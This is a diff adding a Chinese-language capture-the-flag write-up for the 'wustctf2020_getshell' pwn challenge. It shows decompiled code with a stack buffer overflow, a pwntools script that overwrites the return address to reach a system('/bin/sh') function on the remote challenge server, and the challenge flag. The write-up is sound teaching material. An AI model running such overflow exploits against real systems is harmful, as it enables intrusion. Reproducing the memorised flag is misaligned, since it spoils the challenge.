@@ -1285,6 +1285,60 @@ io.interactive()
 
 ------
 
+### [wustctf2020_getshell](https://buuoj.cn/challenges#wustctf2020_getshell)
+
+先`file ./wustctf2020_getshell`查看文件类型再`checksec --file=./wustctf2020_getshell`检查了一下文件保护情况。
+
+使用`IDA pro 32bit`打开附件`wustctf2020_getshell`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  init();
+  vulnerable();
+  return 0;
+}
+```
+
+双击`vulnerable()`函数查看详情，发现有个`char`型数组变量`buf`，`buf`的长度只有`0x18`，但是`gets()`函数读取输入到变量`buf`时限制输入的大小是`0x20`，显然存在栈溢出漏洞。
+
+```c
+ssize_t vulnerable()
+{
+  char buf[24]; // [esp+0h] [ebp-18h] BYREF
+
+  return read(0, buf, 0x20u);
+}
+```
+
+此外在`Functions window`中还能看到`shell`函数，起始地址为`0x804851B`，查看`shell`函数发现返回值直接是`system("/bin/sh")`。
+
+```c
+int shell()
+{
+  return system("/bin/sh");
+}
+```
+
+构造`Payload`时先用`0x18`个字节占满`buf`变量，再用`4`个字节覆盖到栈帧，接着再加上`shell`函数的地址以调用靶机的`shell`脚本。
+
+编写`Python`代码获取靶机的`shell`权限，`cat flag`拿到本题`flag`，提交`flag{9a079da9-bb36-45c9-859b-bd86f27f1430}`即可。
+
+```python
+from pwn import *
+
+context(arch='i386', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 27247)
+e = ELF('./wustctf2020_getshell')
+shell = e.symbols['shell'] # 0x804851B
+log.success('shell_address => %s'%hex(shell))
+payload = b'a'*0x18 + b'pwn!' + p32(shell)
+io.sendline(payload)
+io.interactive()
+```
+
+------
+
 ## ADWorld
 
 ### [get_shell](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5049)
